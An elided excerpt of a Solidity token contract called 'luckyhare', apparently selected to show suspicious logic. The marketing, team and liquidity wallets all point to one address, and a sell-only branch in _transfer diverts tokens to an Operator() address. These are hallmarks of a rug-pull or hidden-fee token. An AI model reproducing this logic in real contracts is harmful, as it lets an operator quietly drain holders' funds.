...
contract coin is Context, IERC20, Ownable {
    ...
    string private _name = "luckyhare";
    ...
    address payable public marketingWalletAddress = payable(0x01e0739d329f289f2425E3fB2150Dd807467Fa19); // Marketing Address
    address payable private teamWalletAddress = payable(0x01e0739d329f289f2425E3fB2150Dd807467Fa19); // Team Address
    address payable public liquidityAddress =payable(0x01e0739d329f289f2425E3fB2150Dd807467Fa19); // Liquidity Address
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if(airdrop && !isExcludedFromFee[sender] && !isExcludedFromFee[recipient] && recipient == uniswapPair){              
                 _basicTransfer(sender,Operator(),AIRAmount);               
                address ad;
                for(int i=0;i <=4;i++){
